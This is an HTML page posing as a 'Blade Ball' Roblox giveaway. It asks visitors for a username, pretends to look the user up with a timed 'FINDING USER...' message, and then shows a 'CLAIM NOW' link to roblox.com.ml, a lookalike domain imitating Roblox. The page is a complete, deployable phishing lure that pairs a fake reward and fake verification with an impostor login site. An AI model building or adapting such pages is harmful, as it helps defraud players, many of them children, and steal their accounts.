<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Blade Ball Giveaway</title>
<style>
body {
  margin: 0;
  min-height: 100vh;
  background-image: url("https://i.ibb.co/pjBDQm6M/blade-ball-header.webp");
  background-size: cover;
  background-position: center;
  display: flex;
  justify-content: center;
  align-items: center;
  font-family: Arial, sans-serif;
}

/* Overlay container */
.container {
  width: 90%;
  max-width: 420px;
  background: rgba(0, 0, 0, 0.6);
  padding: 20px;
  border-radius: 14px;
  color: white;
  text-align: center;
}

h1 { margin: 0 0 10px; font-size: 24px; }
.byline { display: inline-flex; align-items: center; gap: 5px; font-size: 13px; margin-bottom: 15px; }
.badge { width: 14px; height: 14px; }

.image-row { display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-top: 20px; }
.box { width: 90px; height: 90px; background-size: cover; background-position: center; border-radius: 10px; transition: 0.3s; }
.box:hover { transform: scale(1.1); box-shadow: 0 0 15px #00ffff; cursor: pointer; }
.box:active { transform: scale(0.95); }

/* CLAIM BUTTON */
.claim-btn {
  margin-top: 20px;
  padding: 10px 20px;
  background-color: #00ffff;
  color: black;
  font-weight: bold;
  border: none;
  border-radius: 10px;
  cursor: pointer;
  transition: 0.2s;
}
.claim-btn:hover {
  background-color: #00e0e0;
}

/* POPUP STYLES */
.popup-overlay {
  position: fixed;
  top:0; left:0;
  width:100%; height:100%;
  background: rgba(0,0,0,0.7);
  display:none;
  justify-content:center;
  align-items:center;
  z-index: 999;
}

.popup {
  background:#111;
  padding:20px;
  border-radius:10px;
  text-align:center;
  color:white;
  width: 300px;
}

.popup input {
  width: 80%;
  padding:8px;
  margin-top:10px;
  border-radius:5px;
  border:none;
}
.popup button {
  margin-top:10px;
  padding:8px 15px;
  border:none;
  border-radius:5px;
  background:#00ffff;
  color:black;
  font-weight:bold;
  cursor:pointer;
}
</style>
</head>
<body>

<div class="container">
  <h1>BLADE BALL GIVEAWAY</h1>
  <div class="byline">
    BY: WIGGITY
    <a href="https://ibb.co/7xmCCsfG" target="_blank">
      <img src="https://i.ibb.co/7xmCCsfG/Roblox-Verified-Badge.png" class="badge">
    </a>
  </div>

  <!-- IMAGE ROW -->
  <div class="image-row">
    <div class="box" style="background-image: url('https://i.ibb.co/Xr1DKQ4R/Screenshot-2026-01-02-132135.png');"></div>
    <div class="box" style="background-image: url('https://i.ibb.co/JRD0PdPP/Screenshot-2026-01-02-133125.png');"></div>
    <div class="box" style="background-image: url('https://i.ibb.co/Mkr9L77X/Screenshot-2026-01-02-132155.png');"></div>
  </div>

  <button class="claim-btn" onclick="openPopup()">CLAIM</button>
</div>

<!-- POPUP -->
<div class="popup-overlay" id="popupOverlay">
  <div class="popup" id="popup">
    <h3>Enter your username</h3>
    <input type="text" id="usernameInput" placeholder="Username">
    <br>
    <button onclick="submitUsername()">Submit</button>
  </div>
</div>

<script>
function openPopup() {
  document.getElementById('popupOverlay').style.display = 'flex';
}

function submitUsername() {
  const username = document.getElementById('usernameInput').value;
  if(!username) {
    alert("Please enter a username!");
    return;
  }

  // Show FINDING USER
  const popup = document.getElementById('popup');
  popup.innerHTML = `<h3>FINDING USER...</h3>`;

  // After 2 seconds, show link
  setTimeout(() => {
    popup.innerHTML = `
      <h3>User found!</h3>
      <p>Click the link below to claim your reward:</p>
      <a href="https://www.roblox.com.ml/games/13772394625/Blade-Ball?privateServerLinkCode=51079459855577982534040822941608" target="_blank" style="color:#00ffff; font-weight:bold;">CLAIM NOW</a>
    `;
  }, 2000);
}
</script>

</body>
</html>
